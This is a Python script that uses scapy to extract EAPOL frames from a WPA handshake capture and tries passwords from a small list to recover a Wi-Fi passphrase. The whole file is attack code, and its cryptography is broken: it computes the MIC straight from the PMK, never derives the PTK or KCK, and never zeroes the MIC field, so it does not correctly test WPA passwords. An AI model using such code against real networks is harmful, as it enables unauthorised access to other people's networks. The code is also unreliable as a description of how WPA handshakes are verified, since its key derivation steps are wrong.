from scapy.all import rdpcap
from scapy.layers.dot11 import Dot11, Dot11EAPOL
import hashlib
import hmac

# Function to extract EAPOL packets from .cap file
def extract_handshake(file_path):
    packets = rdpcap(file_path)
    eapol_packets = []

    for packet in packets:
        if packet.haslayer(Dot11EAPOL):
            eapol_packets.append(packet)

    if len(eapol_packets) >= 2:
        return eapol_packets[:2]  # Return the first two EAPOL packets (or 3 and 4)
    else:
        print("Handshakes not found")
        return None

# Derive PMK from PSK and SSID using PBKDF2-HMAC-SHA1
def derive_pmk(psk, ssid):
    # PBKDF2-HMAC-SHA1 derivation
    pmk = hashlib.pbkdf2_hmac('sha1', psk.encode(), ssid.encode(), 4096, dklen=32)
    return pmk

# Calculate the MIC using HMAC-SHA1 (Message Integrity Code)
def calculate_mic(pmk, eapol_packet):
    # Data to be hashed for MIC: EAPOL packet
    eapol_data = bytes(eapol_packet[Dot11EAPOL].payload)  # Get the EAPOL payload
    eapol_header = bytes(eapol_packet[Dot11EAPOL].payload)[:21]  # The first part of the EAPOL frame is the header

    # MIC calculation using HMAC-SHA1
    mic = hmac.new(pmk, eapol_data, hashlib.sha1).digest()[:16]  # First 16 bytes are the MIC
    return mic

# Compare the MIC from the derived PMK and the MIC in the EAPOL packet
def check_mic_match(pmk, eapol_packets):
    eapol_packet = eapol_packets[1]  # EAPOL 3 or 4 packet
    mic = calculate_mic(pmk, eapol_packet)

    # Extract the MIC from the EAPOL packet for comparison
    mic_from_packet = eapol_packet[Dot11EAPOL].load[5:21]  # This is where the MIC is located in the EAPOL frame

    if mic == mic_from_packet:
        return True
    return False

# Dictionary attack to find the WPA password
def dictionary_attack(file_path, password_list, ssid):
    eapol_packets = extract_handshake(file_path)
    if not eapol_packets:
        print("No valid handshakes found")
        return None

    for password in password_list:
        pmk = derive_pmk(password, ssid)
        if check_mic_match(pmk, eapol_packets):
            print(f"Password found: {password}")
            return password
    print("Password not found in dictionary")
    return None

# Sample usage
password_list = ["password1", "biscotte", "12345678"]
ssid = "test"
file_path = "wpa.cap"
dictionary_attack(file_path, password_list, ssid)
